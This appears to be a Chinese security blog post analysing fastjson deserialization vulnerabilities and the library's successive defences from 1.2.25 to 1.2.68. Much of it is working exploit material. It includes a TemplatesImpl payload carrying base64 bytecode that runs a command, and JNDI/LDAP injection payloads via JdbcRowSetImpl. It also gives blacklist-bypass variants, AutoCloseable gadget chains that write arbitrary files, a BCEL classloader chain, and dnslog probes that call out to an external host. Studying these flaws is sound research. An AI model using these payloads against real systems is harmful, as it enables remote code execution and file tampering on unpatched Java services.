---
created: '21/11/18'
title: fastjson反序列化
tags:
  - java
  - java安全
---
# fastjson反序列化
***以下代码来源于fastjson1.2.25***
> fastjson反序列化本质上就是通过在反序列化时自动调用getter和setter方法，而某些类的getter和setter方法存在某些危险逻辑(如我们的老朋友`TemplatesImpl`)，从而达到我们的目的(如RCE)。

## fastjson使用
fastjson中常用到的反序列化的方法一共有三个:
- `JSON.parse(String)`
- `JSON.parseObject(String)`
- `JSON.parseObject(String, clazz)`
这三个方法存在着一些差异，可以看后续的简略分析。详情可以见[这里](http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/)



一个简单的例子如下:
```java
import java.util.Properties;

public class User {
    public Integer id;
    public String name;
    private Properties t1;

    public User() {
        System.out.println("call default constructor");
    }

    public String getName() {
        System.out.println("call get name");
        return name;
    }

    public void setName(String name) {
        System.out.println("call set name");
        this.name = name;
    }

    public Integer getId() {
        System.out.println("call get id");
        return id;
    }

    public Properties getT1() {
        System.out.println("call get t1");
        return t1;
    }

    public void setId(Integer id) {
        System.out.println("call set id");
        this.id = id;
    }

    public User(Integer id, String name, Properties t1) {
        System.out.println("call constructor");
        this.id = id;
        this.name = name;
        this.t1 = t1;
    }

    @Override
    public String toString() {
        return "User{" +
                "id=" + id +
                ", name='" + name + '\'' +
                ", t1=" + t1 +
                '}';
    }
}
```
```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Main {
    public static void main(String[] args) {
         User u = new User(5, "tom", new Properties());
        System.out.println("-------toJSONString()------");
        System.out.println(JSON.toJSONString(u));
        System.out.println("-------parse(str)------");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String s = "{\"@type\":\"User\", \"id\": 123, \"name\":\"Tom\", \"t1\":{}}";
        System.out.println(JSON.parse(s));
        System.out.println("-------parseObject(str)------");
        System.out.println(JSON.parseObject(s));
        System.out.println("-------parseObject(str, User.class)------");
        System.out.println(JSON.parseObject(s, User.class));
    }
}
```
最后输出如下:
```
call constructor
-------toJSONString()------
call get id
call get name
call get t1
{"id":5,"name":"tom","t1":{}}
-------parse(str)------
call default constructor
call set id
call set name
call get t1
User{id=123, name='Tom', t1=null}
-------parseObject(str)------
call default constructor
call set id
call set name
call get t1
call get id
call get name
call get t1
{"name":"Tom","id":123}
-------parseObject(str, User.class)------
call default constructor
call set id
call set name
call get t1
User{id=123, name='Tom', t1=null}
```
通过上面的输出我们可以发现fastjson在序列化的时候会调用getter方法，而在反序列化时会优先调用类的无参默认构造方法，然后通过setter的方式去还原我们的对象。

我们可以看到`parse(str)`和`parseObject(str, User.class)`的输出是一样的，而`parseObject(str)`的结果却不太一样。

这里还有一些比较有趣的地方:
1. 为什么`parseObject(str)`和另外两个反序列化的行为不一样？(把所有的getter方法调用了一遍)
2. 为什么反序列化时会调用`getT1()`，而不会调用其他的getter方法？

 ### 第一个问题
 > 为什么`parseObject(str)`和另外两个反序列化的行为不一样？(把所有的getter方法调用了一遍)

这个方法的原因在于`parseObject(str)`时最终返回的是JSONObject，会额外调用一次`toJSON(obj)`。
```java
 public static JSONObject parseObject(String text) {
        Object obj = parse(text);
        return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
}
```
完整的调用链如下:
![](https://gitee.com/guuest/images/raw/master/img/20220210160606.png)
> `toJSON()`方法会将目标类中所有getter方法记录下来，然后通过反射去调用了所有的getter方法

### 第二个问题
> 为什么反序列化时会调用`getT1()`，而不会调用其他的getter方法？

这个问题的答案要到`JavaBeanInfo.build()`方法中去寻找:
> 在`JavaBeanInfo.build()`方法中，程序将会创建一个fieldList数组来存放后续将要处理的目标类的 setter方法及某些特定条件的getter方法。

那么什么getter方法满足条件呢？
```java
if (methodName.length() >= 4 && !Modifier.isStatic(method.getModifiers()) && methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3)) && method.getParameterTypes().length == 0 && (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()))  {
//...
}
// 如果存在setter方法，该成员变量名会被加入fieldList，fieldInfo就不为null，那么getter方法就不会加入fieldList
fieldInfo = getField(fieldList, propertyName);
if (fieldInfo == null) {
    if (propertyNamingStrategy != null) {
        propertyName = propertyNamingStrategy.translate(propertyName);
    }
    add(fieldList, new FieldInfo(propertyName, method, (Field)null, clazz, type, 0, 0, 0, annotation, (JSONField)null, (String)null));
}
```
即满足以下几个条件:
- 对应成员变量继承自Collection/AtomicBoolean/AtomicInteger/AtomicLong
- 对应成员变量没有setter方法
- get开头且第四个字母大写
- 为非静态方法，无参数传入
- 对应的成员变量为私有变量(如果是公有变量则会直接赋值)


### 一些其他注意事项
上面的示例代码中有一个比较奇怪的地方，我们是直接构造了一个字符串去反序列化，而且该字符串中还包含了`@type`这个项，如果我们直接用`toJSONString()`的字符串去反序列化，结果是不是不一样呢？代码最终的输出结果如下:
```
call constructor
-------toJSONString()------
call get id
call get name
call get t1
{"id":5,"name":"tom","t1":{}}
-------parse(str)------
{"name":"tom","id":5,"t1":{}}
-------parseObject(str)------
{"name":"tom","id":5,"t1":{}}
-------parseObject(str, User.class)------
call default constructor
call set id
call set name
call get t1
User{id=5, name='tom', t1=null}
```
可以看到`parse(str)`和`parseObject(str)`不再调用getter和setter方法，而是返回了一个JSONObject类型，并没有将类型转换为User类型，而`parseObject(str, User.class)`则实现了类型转换，依然调用了setter方法和某些getter方法。

所以我们为了能够触发getter和setter方法，需要使用到@type这个项，@type是fastjson中特有的项，用于标注这个对象的类型，当fastjson将其反序列化时会将该对象进行自动类型转换，这也是fastjson反序列化的罪魁祸首，我们称之为autotype。


## fastjson反序列化

### 可利用的类

#### TemplatesImpl
这个是我们的老朋友了，可以在之前的文章或网上的文章中找到关于它的介绍。我们知道，只要能够调用到`TemplatesImpl.getOutputProperties()`方法，最终能够实现任意代码执行。结合前面的分析，我们想要触发getter方法，需要满足一定的条件，我们先来看看这个方法是否满足条件:
```java
// 对应的成员变量
private Properties _outputProperties;

// getter方法
public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
```
可以看到这个成员变量完美地满足了我们的条件，但是这里存在疑惑: `_outputProperties`能够和`getOutputProperties()`方法对应吗？(多了一个下划线)

##### smartMatch
fastjson反序列化时，在`JavaBeanDeserializer.parseField()`方法中使用了`smartMatch()`这个方法来寻找对应的成员变量:
```java
public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType,
                              Map<String, Object> fieldValues) {
        JSONLexer lexer = parser.lexer;
        FieldDeserializer fieldDeserializer = smartMatch(key);
        //...
        return true;
    }

public FieldDeserializer smartMatch(String key) {
    // ...
    if (fieldDeserializer == null) {
     snakeOrkebab = false;  
     String key2 = null;  
      
     for(i = 0; i < key.length(); ++i) {  
     char ch = key.charAt(i);  
     if (ch == '_') {  
     snakeOrkebab = true;  
     key2 = key.replaceAll("_", "");  
     break;  
     }  
     if (ch == '-') {  
     snakeOrkebab = true;  
     key2 = key.replaceAll("-", "");  
     break;  
     } 
    }
    // ...
}
```
可以看到其会将成员变量中的`-`,`_`忽略掉，从而使得`_outputProperties`能够和`getOutputProperties()`方法对应。

##### payload
```json
{
  "@type" : "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes" : ["yv66vgAAADMAHAEAA0NhdAcAFgEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIQ2F0LmphdmEBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAwADQoACwAOAQALbm90ZXBhZC5leGUIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAFkV2aWxDYXQ2NTM4ODI3MzI3MTQxMDABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAXAQAGPGluaXQ+DAAZAAgKABgAGgAhAAIAGAAAAAAAAgAIAAcACAABAAkAAAAWAAIAAAAAAAq4AA8SEbYAFVexAAAAAAABABkACAABAAkAAAARAAEAAQAAAAUqtwAbsQAAAAAAAQAFAAAAAgAG"],
  "_name" : "a",
  "_tfactory" : {},
  "outputProperties" : {}
}
```
这里有几个注意事项:
1. `_bytecodes`中将字节码使用base64编码，这是因为fastjson会对byte类型的字段进行base64解码的缘故，这也方便了我们构造payload
2. `_bytecode`中的字节码是一个构造好的class类，其static块中存在恶意代码，反编译后大致如下:
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class EvilCat653882732714100 extends AbstractTranslet {
    static {
        Runtime.getRuntime().exec("notepad.exe");
    }

    public EvilCat653882732714100() {
    }
}
```
4. **这个类只能在开启SupportNonPublicField特性的fastjson反序列化中使用，因为`_bytecodes`,`_tfactory`等属性都没有对应的setter**
5. `_tfactory`设置为`{}`，这样fastjson会生成一个空对象，可以解决某些jdk版本中`defineTransletClasses()`用到会引用`_tfactory`属性导致异常退出的问题

#### JdbcRowSetImpl
这个类的关键在于其的`setAutoCommit()`方法，最终会发出一个`context.lookup(datasourceName)`请求实现JNDI注入。

##### payload
```json
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:1389/Basic/Command/calc.exe",
    "autoCommit": true
}
```

### 安全机制与bypass
#### 1.2.25
在fastjson 1.2.25中为了解决反序列化问题，加入了黑名单机制和一个安全开关: `autotypesupport`(默认值为false)。如果我们在>=1.2.25版本中再使用上述的payload会报错:`autoType is not support.`，这是由于我们使用的类加入了黑名单的缘故。

根据报错，我们在`ParserConfig.checkAutoType()`中找到了黑名单。整个黑名单如下，只要我们使用的类是以这些开头，就会被黑名单拦截。
```
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

然后我们再看看autotypesupport的作用是什么，通过分析`ParserConfig.checkAutoType()`可以知道根据类名寻找对应的类的步骤大致如下(**fastjson1.2.25，不同版本的步骤有可能有差异**):

1. 如果开启了autotypesupport 或者expectClass不为空时则按白黑名单寻找类(具体步骤看下方)
2. `TypeUtils.getClassFromMapping(typeName)` :尝试从缓存Map中寻找类
3. `this.deserializers.findClass(typeName)`: 尝试从deserializers中寻找类，其中buckets中存放了一些java的基础类
4. 如果上述找到了类，则直接返回
5. 如果未开启autotypesupport则黑白名单寻找类(具体步骤看下方)
6. expectClass校验和注解校验，如果通过则返回
7. 如果上述找到了类，则返回
8. 未开启 autoTypeSupport 则抛出异常(拦截)


##### 未开启autotypesupport
当未开启autotyesupport时，会有以下的步骤:
1. 判断typename是否在黑名单中(以黑名单中的类名开头)，如果是则直接拦截
2. 判断typename是否在白名单中(默认为空)，如果是则根据类名寻找类

可以看到是先进行了一个黑名单的过滤，再从白名单中寻找允许的类。

##### 开启autotypesupport
当开启autotypesupport时，会有以下的步骤:
1. 判断typename是否在在白名单中，如果是则直接根据类名寻找类并返回
2. 判断typename是否在黑名单中(以黑名单中的类名开头)，如果是则直接拦截
3. `TypeUtils.loadClass(typeName, this.defaultClassLoader)`: 调用这个方法去寻找类并返回

注意这里的白名单和我们理解上的白名单存在出入，在白名单中的内容直接通过，但是不在白名单中的内容不一定不通过(因为存在步骤3的缘故)。

可以看到开启了autotypesupport后，依然使用了黑白名单，只是顺序颠倒了。同时假如typename通过了黑白名单，我们还可以通过`TypeUtils.loadClass(typeName, this.defaultClassLoader);`来寻找类，这也是我们后面介绍的绕过方法之一。

##### 1.2.25-1.2.41 bypass
根据上述的步骤我们发现在typename通过了黑白名单后，会通过`TypeUtils.loadClass(typeName, this.defaultClassLoader);`来寻找类，通过分析这个方法，其步骤如下:
1. `mappings.get(className)`从一个缓存的mapping中寻找类
2. 如果className以`[`开头，则去除这个开头并通过递归调用当前函数寻找类
3. 如果className以`L`开头，`;`结尾，则去除这个开头结尾并通过递归调用当前函数寻找类
4. 使用传入的`classLoader`寻找类
5. 使用当前线程的`contextClassLoader`寻找类
6. 使用`Class.forName`寻找类

从以上步骤我们就发现了可以绕过黑白名单并能成功加载类的方法:
1. 类名使用`L`开头，`;`结尾
2. 类名使用`[`
顺便一提fastjson为什么要处理这些奇怪的字符，实际上它们是JNI的字段描述符，以`L`开头;`;`结尾代表的是java中的Object，以`[`开头代表的是数组。

所以我们最终的绕过payload为:
```json
{
    "@type": "Lcom.sun.rowset.JdbcRowSetImpl;",
    "dataSourceName": "ldap://127.0.0.1:1389/Basic/Command/calc.exe",
    "autoCommit": true
}
```
或者
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Basic/Command/calc.exe","autoCommit":true}]}
```
注意第二个绕过的payload并不是一个合法的json格式，但是fastjson能够成功解析

#### 1.2.42
这个版本主要的安全改动是将黑名单改为hash，同时使用hash去处理了 `L` `[` `;`字符，去除头尾的 `L` `[` `;`:
```java
this.denyHashCodes = new long[]{-8720046426850100497L, -8109300701639721088L, -7966123100503199569L, -7766605818834748097L, -6835437086156813536L, -4837536971810737970L, -4082057040235125754L, -2364987994247679115L, -1872417015366588117L, -254670111376247151L, -190281065685395680L, 33238344207745342L, 313864100207897507L, 1203232727967308606L, 1502845958873959152L, 3547627781654598988L, 3730752432285826863L, 3794316665763266033L, 4147696707147271408L, 5347909877633654828L, 5450448828334921485L, 5751393439502795295L, 5944107969236155580L, 6742705432718011780L, 7179336928365889465L, 7442624256860549330L, 8838294710098435315L};
// ...
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                className = className.substring(1, className.length() - 1);
}
```

##### 1.2.25-1.2.42 bypass
这里的处理只是处理了一次，所以存在经典的双写绕过，即双写`L` `;`。所以我们最终的绕过payload为:
```json
{
    "@type": "LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName": "ldap://127.0.0.1:1389/Basic/Command/calc.exe",
    "autoCommit": true
}
```

#### 1.2.43
这个版本的fastjson判断只要以LL开头就直接抛出异常:
```java
if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) {
                    throw new JSONException("autoType is not support. " + typeName);
}
```
##### 1.2.25-1.2.43 bypass
实际上我们依然能够使用数组的方式(以`[`开头)进行绕过，所以我们上面的绕过payload依然可行:
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Basic/Command/calc.exe","autoCommit":true}]}
```

#### 1.2.44
这个版本的fastjson判断只要以`[`开头就抛出异常，以`;`结尾也抛出异常，因此我们上述的绕过方法都失效了:
```java
long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;
if (h1 == -5808493101479473382L) {
    throw new JSONException("autoType is not support. " + typeName);
} else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) {
    throw new JSONException("autoType is not support. " + typeName);
}
```

##### 1.2.25-1.2.44 bypass
这个bypass主要是用到的一个黑名单外的类，其是mybatis包里的类，所以需要有mybatis的依赖:
```json
{
    "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties": {
        "data_source": "ldap://127.0.0.1:23457/Command8"
    }
}
```

#### 1.2.44-1.2.47
增加了黑名单，同时截止到1.2.47版本，fastjson存在一个危害比较大的反序列化绕过方式，即上面提到的缓存机制。

##### <=1.2.47 bypass
我们上面提到假如fastjson从缓存的mapping中找到类后会直接返回，那么有没有一种方式可以使得一个类缓存呢？我们先看看最终的payload:
```json
{
    "payload1": {
        "@type": "java.lang.Class",
        "val": "com.sun.rowset.JdbcRowSetImpl"
    },
    "payload2": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
    }
}
```
可以看到这个payload中使用到了2次@type，并且在第一个@type中指定了类型为`java.lang.Class`这个看起来比较特殊的类，并且存在val字段为`com.sun.rowset.JdbcRowSetImpl`，第二段中则是我们的原始payload。
我们通过调试来理解这个payload，当fastjson在处理第一个@type时，会在`this.deserializers.findClass(typeName)`找到Class这个类，然后这个类会被返回，在上层经过一些赋值，最终会使用MiscCodec这个deserializer来对这个类进行解析:
![](https://gitee.com/guuest/images/raw/master/img/20220211141552.png)
跟进这个方法，这里也可以看到它会从val中拿到值，并赋值给objVal:
![](https://gitee.com/guuest/images/raw/master/img/20220211142238.png)

后面又将objVal的值赋给strVal:
![](https://gitee.com/guuest/images/raw/master/img/20220211142341.png)
判断clazz的类型，这里是Class.class，最后会根据strVal里的值加载类:
![](https://gitee.com/guuest/images/raw/master/img/20220211142606.png)
同时我们可以看到使用`TypeUtils.loadClass()`时默认是将类缓存的，这样我们就将我们的恶意类放入了缓存。
![](https://gitee.com/guuest/images/raw/master/img/20220211142702.png)
到第二个@type时，由于缓存已经存在这个恶意类，所以会直接返回，而不会走黑名单，所以我们的payload就能够绕过之前的安全机制。

这里有一些注意事项，由于不同版本的`ParserConfig.checkAutoType()`解析存在差异，因此:
-   1.2.25-1.2.32：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发
-   1.2.33-1.2.47：无论是否开启AutoTypeSupport，都能成功利用

这里存在的差异主要是由于在1.2.33-1.2.47中黑名单会判断类是否已经在缓存中，如果已经在缓存里则不会进行拦截:
![](https://gitee.com/guuest/images/raw/master/img/20220211143108.png)
而在旧版本中则不存在这个判断，因此在1.2.25-1.2.32时，如果开启了autotypesupport，则会直接被黑名单拦截。




#### 1.2.48-1.2.67
这版本的fastjson主要是继续添加黑名单，同时`TypeUtils.loadClass()`方法默认不启用缓存:
![](https://gitee.com/guuest/images/raw/master/img/20220211143808.png)

![](https://gitee.com/guuest/images/raw/master/img/20220211143818.png)


##### <=1.2.67 expectclass bypass
上面的绕过方式都行不通了，我们还有什么方法可以加载恶意类吗？实际上在`TypeUtils.checkAutoType()`还存在着一个加载类的语句:
![](https://gitee.com/guuest/images/raw/master/img/20220211151916.png)
这里的条件`autotypesupport || jsonType || expectClassFlag`，这里autotypesupport不管开关都影响不大，因为我们没办法绕过前面的黑名单检测，我们重点关注`expectClassFlag`这个选项，其在这里被赋值:
![](https://gitee.com/guuest/images/raw/master/img/20220211152313.png)
这里需要满足以下几个条件`expectClassFlag`才为true:
1. expectClass存在
2. expectClass不在黑名单里

我们可以看到expectClass是调用该函数时传入的，在整个fastjson中寻找checkAutoType的调用且expectClass不为空的，在`JavaBeanDeserializer.deserialize()`方法中找到我们的目标:
![](https://gitee.com/guuest/images/raw/master/img/20220211153326.png)
这里的分析由于有点复杂，参考了其他师傅的文章，想要进入到这个位置，需要两个@type，第二个需要实现 AutoCloseable 接口，也就是最终payload类似于:
```json
1.  `{"@type":"java.lang.AutoCloseable","@type":"com.example.json.evil.Evil","cmd":"calc"}`
```
这样我们就能够反序列化实现了AutoCloseable的类，利用这个绕过去实现攻击需要寻找到合适的实现了AutoCloseable的类并将他们组合起来，一些可用的payload如下:
第一个:
```json
{
    "stream": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
        "targetPath": "./hacked.txt", \\创建一个空文件
        "tempPath": "./test.txt"\\创建一个有内容的文件
    },
    "writer": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.esotericsoftware.kryo.io.Output",
        "buffer": "cHdu", \\base64后的文件内容
        "outputStream": {
            "$ref": "$.stream"
        },
        "position": 5
    },
    "close": {
        "@type": "java.lang.AutoCloseable",
        "@type": "com.sleepycat.bind.serial.SerialOutput",
        "out": {
            "$ref": "$.writer"
        }
    }
}
```
上述payload需要目标环境存在以下的依赖:
```xml
<dependency>
  <groupId>com.sleepycat</groupId>
  <artifactId>je</artifactId>
  <version>5.0.73</version>
</dependency>

<dependency>
  <groupId>com.esotericsoftware</groupId>
  <artifactId>kryo</artifactId>
  <version>4.0.0</version>
</dependency>

<dependency>
  <groupId>org.aspectj</groupId>
  <artifactId>aspectjtools</artifactId>
  <version>1.9.5</version>
</dependency>
```

第二个:
```json
{
    "@type": "java.lang.AutoCloseable",
    "@type": "sun.rmi.server.MarshalOutputStream",
    "out": {
        "@type": "java.util.zip.InflaterOutputStream",
        "out": {
           "@type": "java.io.FileOutputStream",
           "file": "/tmp/asdasd",
           "append": true
        },
        "infl": {
           "input": {
               "array": "eJxLLE5JTCkGAAh5AnE=",
               "limit": 14
           }
        },
        "bufLen": "100"
    },
    "protocolVersion": 1
}
```
上述的payload需要java保留了LocalVariableTable，参考其他师傅的原话:
> 而我在多个不同的操作系统下的 OpenJDK、Oracle JDK 进行测试，目前只发现 CentOS 下的 OpenJDK 8 字节码调试信息中含有 LocalVariableTable（根据沈沉舟的文章，RedHat 下的 JDK8 安装包也会有，不过他并未说明是 OpenJDK 还是 Oracle JDK，我未做测试）。

第三个(需要commons-io 2.x版本):
commons-io 2.0 - 2.6 版本:
```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "encoding":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "is":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
}
```
commons-io 2.7 - 2.8.0 版本:
```json
{
  "x":{
    "@type":"com.alibaba.fastjson.JSONObject",
    "input":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.ReaderInputStream",
      "reader":{
        "@type":"org.apache.commons.io.input.CharSequenceReader",
        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
        "start":0,
        "end":2147483647
      },
      "charsetName":"UTF-8",
      "bufferSize":1024
    },
    "branch":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.output.WriterOutputStream",
      "writer":{
        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
        "file":"/tmp/pwned",
        "charsetName":"UTF-8",
        "append": false
      },
      "charsetName":"UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger2":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    },
    "trigger3":{
      "@type":"java.lang.AutoCloseable",
      "@type":"org.apache.commons.io.input.XmlStreamReader",
      "inputStream":{
        "@type":"org.apache.commons.io.input.TeeInputStream",
        "input":{
          "$ref":"$.input"
        },
        "branch":{
          "$ref":"$.branch"
        },
        "closeBranch": true
      },
      "httpContentType":"text/xml",
      "lenient":false,
      "defaultEncoding":"UTF-8"
    }
  }
```

第四个(需要tomcat-dbcp依赖，是tomcat的数据库驱动依赖):
```json
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```
详情分析参考[这里](https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html)


更多的利用链在[Blackhat 2021 议题详细分析—— FastJson 反序列化漏洞及在区块链应用中的渗透利用](http://noahblog.360.cn/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/)

#### 1.2.68
添加了safeMode这个安全开关，开启后不再有autotype，@type键无效，但是这个开关默认是关闭的，依然可以使用上述的expectclass bypass。


### 检测fastjson

#### dnslog
```json
{"@type":"java.net.InetAddress","val":"dnslog"} 在49以下才能触发
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
{{"@type":"java.net.URL","val":"http://dnslog"}:"aaa"}
Set[{"@type":"java.net.URL","val":"http://dnslog"}]
Set[{"@type":"java.net.URL","val":"http://dnslog"}
```

#### 检测版本
参考了[这篇文章](https://blog.csdn.net/weixin_43510203/article/details/115277081)，需要在响应中输出异常才能用。

> 1.当代码使用 `JSON.parseObject(json , clazz)`指定期望类的方式去解析 JSON，且 clazz 不能为 fastjson 已设定的大部分类型，如“Hashmap”、“ArrayList”。
> 
> 2.当使用`JSON.parse(json)` 不指定期望类的时候可以通过 AutoCloseable 来触发

所以可用的payload为:
第一种:
```json
a
```
第二种:
```json
{"@type":"java.lang.AutoCloseable"
```

## 其他注意事项
![](https://gitee.com/guuest/images/raw/master/img/1.jpg)
